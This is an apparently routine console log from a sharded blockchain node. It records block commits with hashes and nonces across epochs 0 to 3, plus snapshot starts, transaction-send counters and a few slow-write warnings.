[0;32mINFO [0m[2026-10-06 22:02:51.019] [process/block]      [0/0/9/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 9 [0;32mnonce[0m = 8 [0;32mhash[0m = fcc9c238e3c0b8583d0ac32f3fc6d993d69408b046c35359d37fa2a7ba9920aa 
[0;32mINFO [0m[2026-10-06 22:02:57.014] [process/block]      [0/0/10/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 10 [0;32mnonce[0m = 9 [0;32mhash[0m = 3251be20e3a1430b0cb2aaf39abb7d6f68d4743b9bb63ae63b36464a7436fd57 
[0;32mINFO [0m[2026-10-06 22:03:03.017] [process/block]      [0/0/11/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 11 [0;32mnonce[0m = 10 [0;32mhash[0m = d7751e8c75702442ebebd173e134f3bbe2843dc6d63110283d529b518f58d818 
[0;32mINFO [0m[2026-10-06 22:03:09.018] [process/block]      [0/0/12/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 12 [0;32mnonce[0m = 11 [0;32mhash[0m = a5afdd224e6e20c412a9110259ad74fcf5a3cfb4af7bd55c831f847aa9971f6e 
[0;32mINFO [0m[2026-10-06 22:03:15.018] [process/block]      [0/0/13/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 13 [0;32mnonce[0m = 12 [0;32mhash[0m = 3f9e2b17674e22f6c44f9391142afe082368930b3f979a1b0a6ab1ff6db3a2dc 
[0;32mINFO [0m[2026-10-06 22:03:21.024] [process/block]      [0/0/14/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 14 [0;32mnonce[0m = 13 [0;32mhash[0m = 58ec9c87aabf474fee7c30fb5d1b83598bbaddfc16aedc73e089f415b5be7d7a 
[0;32mINFO [0m[2026-10-06 22:03:27.018] [process/block]      [0/0/15/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 15 [0;32mnonce[0m = 14 [0;32mhash[0m = da363faaef0e970e4a6f0dff6ae4902d014556b192495b8ad4c7e66dcd56fea3 
[0;32mINFO [0m[2026-10-06 22:03:33.017] [process/block]      [0/0/16/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 16 [0;32mnonce[0m = 15 [0;32mhash[0m = cc0a413ba2c205daf2a926df638df38d865b29aa5bb5e544e62658874ece68e7 
[0;32mINFO [0m[2026-10-06 22:03:39.017] [process/block]      [0/0/17/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 17 [0;32mnonce[0m = 16 [0;32mhash[0m = 7a1fca6d7e7d454798cbc4da4b88665dac5b4afeb426b5d67299f63157e79567 
[0;32mINFO [0m[2026-10-06 22:03:45.019] [process/block]      [0/0/18/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 18 [0;32mnonce[0m = 17 [0;32mhash[0m = a24bcbbb118cca329fe797216f78d8ed81cb5f67460e5a8e08104ad47d1ed483 
[0;32mINFO [0m[2026-10-06 22:03:51.024] [process/block]      [0/0/19/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 19 [0;32mnonce[0m = 18 [0;32mhash[0m = 1d440629ecaab36c1d1995c866f4525fab933d4933c0abb50eee4664c42251ce 
[0;32mINFO [0m[2026-10-06 22:03:57.015] [process/block]      [0/0/20/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 20 [0;32mnonce[0m = 19 [0;32mhash[0m = d5edaee92782c5150a9e8a5bcf9d59077440de006d3446df18f039f115e05fc1 
[0;32mINFO [0m[2026-10-06 22:04:03.021] [process/block]      [0/0/21/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 21 [0;32mnonce[0m = 20 [0;32mhash[0m = e88f671ee60e08ecf0471ca0b7411370ecd0b70cc58ad88b9862be9cd3dcb3a1 
[0;32mINFO [0m[2026-10-06 22:04:09.014] [process/block]      [0/0/22/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 22 [0;32mnonce[0m = 21 [0;32mhash[0m = 5f6dd2ec590bcaa8bb39195e9bd4794405995ad00d0092516217692c88243d6c 
[0;32mINFO [0m[2026-10-06 22:04:15.021] [process/block]      [0/0/23/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 23 [0;32mnonce[0m = 22 [0;32mhash[0m = 18578d86977b586cbce97167926e717ded597fb2230d2bceb4f2dfabf63a8b60 
[0;32mINFO [0m[2026-10-06 22:04:21.017] [process/block]      [0/0/24/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 24 [0;32mnonce[0m = 23 [0;32mhash[0m = 18bd49d3bbda56fe4e5564ae770d51511fda48a83dd39feb84d7ce77fd7ff9ab 
[0;32mINFO [0m[2026-10-06 22:04:27.012] [process/block]      [0/0/25/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 25 [0;32mnonce[0m = 24 [0;32mhash[0m = 34a7ea4de92180120f258f31622f7ea73777251a1aaa88b6ca06193d214e50cb 
[0;32mINFO [0m[2026-10-06 22:04:33.015] [process/block]      [0/0/26/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 26 [0;32mnonce[0m = 25 [0;32mhash[0m = 579e849de660393f9617fd08724e0bc658fa49c9607bc009ab625706d5279eca 
[0;32mINFO [0m[2026-10-06 22:04:39.007] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:39.008] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:48.003] [process/block]      [0/1/28/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 28 [0;32mnonce[0m = 26 [0;32mhash[0m = f9c7d6f5851cd6f918d56c686bb639c5371f3c457f4a972b637c72d0b814e166 
[0;33mWARN [0m[2026-10-06 22:04:49.647] [process/block]      [0/1/28/(END_ROUND)] saveMetaHeader                           [0;33melapsed time[0m = 1.638912375s 
[0;32mINFO [0m[2026-10-06 22:04:49.663] [state]              [0/1/28/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 [0;32mepoch[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:51.025] [process/block]      [0/1/29/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 29 [0;32mnonce[0m = 27 [0;32mhash[0m = d72db60a3ba3f76f2e43bd6f2671a89840e19b8eb399aacdc337926acbbdb0de 
[0;32mINFO [0m[2026-10-06 22:04:57.017] [process/block]      [0/1/30/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 30 [0;32mnonce[0m = 28 [0;32mhash[0m = d41b91c520c1a19432fda0bdd0ff5a20b52d27bb744a67f219059a88d257ad6f 
[0;32mINFO [0m[2026-10-06 22:05:03.018] [process/block]      [0/1/31/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 31 [0;32mnonce[0m = 29 [0;32mhash[0m = e097f2f6af1a03acf564fd1db08a79de52cf21a1b3304c3e605d7cf199f7d8e3 
[0;32mINFO [0m[2026-10-06 22:05:09.018] [process/block]      [0/1/32/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 32 [0;32mnonce[0m = 30 [0;32mhash[0m = b30735c1b534124f21adaa8cb55ff08e9ae5dcc0ab664c0b59326eb30fe2ae29 
[0;32mINFO [0m[2026-10-06 22:05:15.025] [process/block]      [0/1/33/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 33 [0;32mnonce[0m = 31 [0;32mhash[0m = 26ee8731261ba47e54827e21ee512223dbc3d34c6fd4d3fb2b1994b3c3b609b7 
[0;32mINFO [0m[2026-10-06 22:05:19.070] [txsSender]          [0/1/33/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 1 
[0;32mINFO [0m[2026-10-06 22:05:21.023] [process/block]      [0/1/34/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 34 [0;32mnonce[0m = 32 [0;32mhash[0m = fad1e91ddfbe5276917e94129538fb7e0bb4773f7fef1b90670d6b2a09acae4d 
[0;32mINFO [0m[2026-10-06 22:05:27.023] [process/block]      [0/1/35/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 35 [0;32mnonce[0m = 33 [0;32mhash[0m = f5341383ffa39c91eec82579b5ff574f85b51d3ddc580fb8199e0a1536637e12 
[0;32mINFO [0m[2026-10-06 22:05:33.021] [process/block]      [0/1/36/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 36 [0;32mnonce[0m = 34 [0;32mhash[0m = 61ea7b42c995e12be99bd59668db8f48b449216f05ef8a7f5b91a9a9c3b2fd79 
[0;32mINFO [0m[2026-10-06 22:05:39.020] [process/block]      [0/1/37/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 37 [0;32mnonce[0m = 35 [0;32mhash[0m = a3e5c96e7d34fc453e171c92ba4ee5559674951d6d77dd77885fee512599f613 
[0;32mINFO [0m[2026-10-06 22:05:45.017] [process/block]      [0/1/38/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 38 [0;32mnonce[0m = 36 [0;32mhash[0m = cd6646c16b5d7b2f1c881b600412c4921ca59a7b400227a7b8c81bec5a360fc0 
[0;32mINFO [0m[2026-10-06 22:05:51.031] [process/block]      [0/1/39/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 39 [0;32mnonce[0m = 37 [0;32mhash[0m = 85471babb00c8eaed4f1b0863d262b337b72a43c1c0a8c9cb7ec299c8da44da5 
[0;32mINFO [0m[2026-10-06 22:05:57.026] [process/block]      [0/1/40/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 40 [0;32mnonce[0m = 38 [0;32mhash[0m = 3a4c5a6fdc068112bc997093d2145763fd9f979132d6b208b439d18e44d056d6 
[0;32mINFO [0m[2026-10-06 22:06:01.073] [txsSender]          [0/1/40/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 2 
[0;32mINFO [0m[2026-10-06 22:06:03.025] [process/block]      [0/1/41/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 41 [0;32mnonce[0m = 39 [0;32mhash[0m = 7be317ad062b3ee2e48b6f3cac5a5081936ffec302ca083dda1da1182539c5a1 
[0;32mINFO [0m[2026-10-06 22:06:18.006] [process/block]      [0/1/43/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 43 [0;32mnonce[0m = 40 [0;32mhash[0m = 62ade4e48f729a692e13c9707173bf008d42e7337630fe0ad0e8a21ffd695047 
[0;32mINFO [0m[2026-10-06 22:06:21.036] [process/block]      [0/1/44/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 44 [0;32mnonce[0m = 41 [0;32mhash[0m = b24399f37dff235d8252e514d4c6d94dc10a0f6b2dbcb0c3264bea9c1fbc47f3 
[0;32mINFO [0m[2026-10-06 22:06:27.023] [process/block]      [0/1/45/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 45 [0;32mnonce[0m = 42 [0;32mhash[0m = ac6ea7dba63d2ca816bc09e57aa56beda2fc89c311681cf8d6572c5f19410be1 
[0;32mINFO [0m[2026-10-06 22:06:33.023] [process/block]      [0/1/46/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 46 [0;32mnonce[0m = 43 [0;32mhash[0m = 8036e413b7f84717e241205304b6967a6b42372145db3574b49a3fdd8f69d415 
[0;32mINFO [0m[2026-10-06 22:06:39.021] [process/block]      [0/1/47/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 47 [0;32mnonce[0m = 44 [0;32mhash[0m = d433f3c0bdfb6977a790d1d3ba60abf059e18a00f120f0ea3af009c590ffcc1a 
[0;32mINFO [0m[2026-10-06 22:06:43.078] [txsSender]          [0/1/47/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 3 
[0;32mINFO [0m[2026-10-06 22:06:45.022] [process/block]      [0/1/48/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 48 [0;32mnonce[0m = 45 [0;32mhash[0m = 8d284ab63355d3fdc06361b7373d055ea9b0a8b8f7725c20e3db60e136e2cb48 
[0;32mINFO [0m[2026-10-06 22:06:51.025] [process/block]      [0/1/49/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 49 [0;32mnonce[0m = 46 [0;32mhash[0m = cc29082633c650dd24e6a36d6c27b67b25c15c39f5a4284a8efebf8437d83c98 
[0;32mINFO [0m[2026-10-06 22:06:57.020] [process/block]      [0/1/50/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 50 [0;32mnonce[0m = 47 [0;32mhash[0m = f93f78d1b87acffc2b890caf5f53e20d5b9478086b85d7cf1897fdb507127622 
[0;32mINFO [0m[2026-10-06 22:07:04.082] [txsSender]          [0/1/51/(BLOCK)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 4 
[0;32mINFO [0m[2026-10-06 22:07:09.007] [process/block]      [0/2/52/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 51 [0;32mnonce[0m = 48 [0;32mhash[0m = 754796a81a99a5e8b504cee5e13aa086f9156c4ddc472380caf32c1d1f05c408 
[0;32mINFO [0m[2026-10-06 22:07:09.014] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:09.014] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;33mWARN [0m[2026-10-06 22:07:09.933] [process/block]      [0/2/52/(END_ROUND)] saveBody                                 [0;33melapsed time[0m = 913.537916ms 
[0;32mINFO [0m[2026-10-06 22:07:10.908] [process/block]      [0/2/52/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 52 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 
[0;32mINFO [0m[2026-10-06 22:07:10.930] [state]              [0/2/52/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = a518a5c28291a61b129dfd908f2492adb0ac4f9425d9adc0fc072e39a59d2f0f [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:10.941] [process/block]      [0/2/52/(END_ROUND)] supernova transition is ready            [0;32mshard[0m = 0 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 [0;32mepoch[0m = 2 [0;32mround[0m = 52 
[0;32mINFO [0m[2026-10-06 22:07:15.020] [process/block]      [0/2/53/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 53 [0;32mnonce[0m = 50 [0;32mhash[0m = 9e424fc756e7d48ac81bdc19a20824f6b38d2e53626e8475dd85a434399f9038 
[0;32mINFO [0m[2026-10-06 22:07:21.033] [process/block]      [0/2/54/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 54 [0;32mnonce[0m = 51 [0;32mhash[0m = 3538b19ce9ad03d99f8060ef759ea1fa32ac6982c50eda20cd2c67934e5336bc 
[0;32mINFO [0m[2026-10-06 22:07:27.017] [process/block]      [0/2/55/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 55 [0;32mnonce[0m = 52 [0;32mhash[0m = 68ec1297b966cacb680bb988ac42effa38afc9e580d72983b7006489825a80a2 
[0;32mINFO [0m[2026-10-06 22:07:33.018] [process/block]      [0/2/56/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 56 [0;32mnonce[0m = 53 [0;32mhash[0m = 608cd4a284caca7ddf70cb5e0aea914c3aa0fbc605d87601a06f834f221685ec 
[0;32mINFO [0m[2026-10-06 22:07:39.019] [process/block]      [0/2/57/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 57 [0;32mnonce[0m = 54 [0;32mhash[0m = 2131c5a99673d22dce03747566dc2288270ae224aa36d26002e94d843ee62900 
[0;32mINFO [0m[2026-10-06 22:07:45.014] [process/block]      [0/2/58/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 58 [0;32mnonce[0m = 55 [0;32mhash[0m = a68386bda3d914aef78d1a30b51f4f717c75debbf65123a4e1c1a5cf425b9e77 
[0;32mINFO [0m[2026-10-06 22:07:51.019] [process/block]      [0/2/59/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 59 [0;32mnonce[0m = 56 [0;32mhash[0m = 7465bca05cad5d9424100c1425e0d53a0d9b2087a6bd0a4cdae7d949344b615d 
[0;32mINFO [0m[2026-10-06 22:07:57.019] [process/block]      [0/2/60/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 60 [0;32mnonce[0m = 57 [0;32mhash[0m = 57bfb935e64a756d45fb2e73d6172214a9fc6e2389737ecb2b0307c230151a14 
[0;32mINFO [0m[2026-10-06 22:08:03.022] [process/block]      [0/2/61/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 61 [0;32mnonce[0m = 58 [0;32mhash[0m = 71ff11a30aeb99162b207422b686d39d592699393155419997acfe39c561d4ed 
[0;32mINFO [0m[2026-10-06 22:08:09.021] [process/block]      [0/2/62/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 62 [0;32mnonce[0m = 59 [0;32mhash[0m = 34cbab52b6d4fbf1890efdc4074c007fdb3003826d8d16b98d7ba813baff3283 
[0;32mINFO [0m[2026-10-06 22:08:15.019] [process/block]      [0/2/63/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 63 [0;32mnonce[0m = 60 [0;32mhash[0m = 76a498ab7fc288982a6baa46f37d7f03644c420ad3d78be1ab4c8bd19df3417b 
[0;32mINFO [0m[2026-10-06 22:08:21.023] [process/block]      [0/2/64/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 64 [0;32mnonce[0m = 61 [0;32mhash[0m = f29bc614ab9bd58f8296f8dbe120dbe4fe8bbd3dc5dad4447e3252e450d917ec 
[0;32mINFO [0m[2026-10-06 22:08:27.016] [process/block]      [0/2/65/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 65 [0;32mnonce[0m = 62 [0;32mhash[0m = b9391d22672c7a2cb7083724286af774240bb58ac76abd635919365a63ea2b54 
[0;32mINFO [0m[2026-10-06 22:08:33.017] [process/block]      [0/2/66/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 66 [0;32mnonce[0m = 63 [0;32mhash[0m = bbd7c3bc2aafef38f22ba7338751b538de4aeae7118e536abca571f7eabcf462 
[0;32mINFO [0m[2026-10-06 22:08:39.018] [process/block]      [0/2/67/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 67 [0;32mnonce[0m = 64 [0;32mhash[0m = a4ab9a89a9ecd6c5ca3a95d458f27aedf481a75e7317e65d269081be621ba6d8 
[0;32mINFO [0m[2026-10-06 22:08:45.019] [process/block]      [0/2/68/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 68 [0;32mnonce[0m = 65 [0;32mhash[0m = 83cc45fe52ff0e0de000064eb406bf8af0291a3a1c96ea10eaed31d3fce15e89 
[0;32mINFO [0m[2026-10-06 22:08:51.020] [process/block]      [0/2/69/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 69 [0;32mnonce[0m = 66 [0;32mhash[0m = f7cd5d533d860982fd22ad45a10a44aaaaa8c3d318630338217975fc0f107f54 
[0;32mINFO [0m[2026-10-06 22:08:57.016] [process/block]      [0/2/70/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 70 [0;32mnonce[0m = 67 [0;32mhash[0m = 0d49f5ea35b970b6af2479b7f617ac6ba705d0348bbfb5444c60618ed6031b24 
[0;32mINFO [0m[2026-10-06 22:09:03.014] [process/block]      [0/2/71/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 71 [0;32mnonce[0m = 68 [0;32mhash[0m = cab0dddfc0c54296efd10e3a6c768cf65e05a014bc7450a70427319a866926ae 
[0;32mINFO [0m[2026-10-06 22:09:09.019] [process/block]      [0/2/72/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 72 [0;32mnonce[0m = 69 [0;32mhash[0m = 0429c42bc61394cd44582550a68a72aaf0044e68de9923f8a11805294f983902 
[0;32mINFO [0m[2026-10-06 22:09:15.029] [process/block]      [0/2/73/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 73 [0;32mnonce[0m = 70 [0;32mhash[0m = 56aa8b0eeabdcd5e07003e9e20f023f8a2153d47d2cc8081468675415d717117 
[0;32mINFO [0m[2026-10-06 22:09:24.021] [process/block]      [0/3/74/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 74 [0;32mnonce[0m = 71 [0;32mhash[0m = acc0c67794d94f46df340547791ce1e9da2a46a07c24399227474395832153a2 
[0;32mINFO [0m[2026-10-06 22:09:27.016] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:27.016] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:29.067] [process/block]      [0/3/75/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 75 [0;32mnonce[0m = 72 [0;32mhash[0m = e2f6bf4c84964ab371ac13f754590222a029382e7c4583ce2b1f12d358af2244 
[0;32mINFO [0m[2026-10-06 22:09:29.075] [state]              [0/3/75/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 2c473afb8c885d35d627983af2acb0bae6723a2099552c9bc2fb362441561d56 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:33.018] [process/block]      [0/3/76/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 76 [0;32mnonce[0m = 73 [0;32mhash[0m = 03320edef061391af970a7278631dba85bcb8cdc1976a6d6610b7d77a0e85b0a 
[0;32mINFO [0m[2026-10-06 22:09:39.020] [process/block]      [0/3/77/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 77 [0;32mnonce[0m = 74 [0;32mhash[0m = a9b39869efb6b21d31131ffdf6b10983f3a8a1942fd299473a751ae9c1e8b32b 
[0;32mINFO [0m[2026-10-06 22:09:45.012] [process/block]      [0/3/78/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 78 [0;32mnonce[0m = 75 [0;32mhash[0m = c2df6b76de1588b28b1ec06cfa05c81c3933058b1c97ad9e5652b0dc9bf5ede8 
[0;32mINFO [0m[2026-10-06 22:09:51.027] [process/block]      [0/3/79/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 79 [0;32mnonce[0m = 76 [0;32mhash[0m = 4b0b3a4c9e3a679c8f38420cdf1645ad0da6df5c3be5cfe3d5b531df68908c33 
[0;32mINFO [0m[2026-10-06 22:09:57.016] [process/block]      [0/3/80/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 80 [0;32mnonce[0m = 77 [0;32mhash[0m = c125089cf86db66258ceaeeaaf307831269e6f927984381ba1327d1d2ebd9db7 
[0;32mINFO [0m[2026-10-06 22:10:03.022] [process/block]      [0/3/81/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 81 [0;32mnonce[0m = 78 [0;32mhash[0m = 00a057f4b042c2bef140bfab788d454b12becb77c2f1c00916503d55a857316c 
[0;32mINFO [0m[2026-10-06 22:10:09.016] [process/block]      [0/3/82/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 82 [0;32mnonce[0m = 79 [0;32mhash[0m = 9809702a1e77c948885306d007bc4f808c900a4485f91164c1bffcc92244a18d 
[0;32mINFO [0m[2026-10-06 22:10:15.021] [process/block]      [0/3/83/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 83 [0;32mnonce[0m = 80 [0;32mhash[0m = 8281c2d4b85db434674eddcd06b23edd60f1d8719a1c4e3173a8ece11833494d 
[0;32mINFO [0m[2026-10-06 22:10:21.016] [process/block]      [0/3/84/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 84 [0;32mnonce[0m = 81 [0;32mhash[0m = 7617a76e3ed0a08125d4cc31372fc9faf667ee8781f754882cbc9554c2dc594b 
[0;32mINFO [0m[2026-10-06 22:10:27.028] [process/block]      [0/3/85/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 85 [0;32mnonce[0m = 82 [0;32mhash[0m = 38d25a0e5f43aaf12bf9ccce1fbca5866d05f0942613b579c505dee50bee70f2 
[0;32mINFO [0m[2026-10-06 22:10:33.019] [process/block]      [0/3/86/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 86 [0;32mnonce[0m = 83 [0;32mhash[0m = 6711add0d388374d90aa72cde191e7a85bec19e461635eaf5eb41cb633836db8 
[0;32mINFO [0m[2026-10-06 22:10:39.016] [process/block]      [0/3/87/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 87 [0;32mnonce[0m = 84 [0;32mhash[0m = 7c648ce0ac4bee03dd10c8ed577ecc38fd54b683bf2470b71bf1ca688ae0c7c3 
[0;32mINFO [0m[2026-10-06 22:10:45.017] [process/block]      [0/3/88/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 88 [0;32mnonce[0m = 85 [0;32mhash[0m = 568996efae6f5dd82897a99442f959c7b3524380ac4058c1623ddf9c33cc9d74 
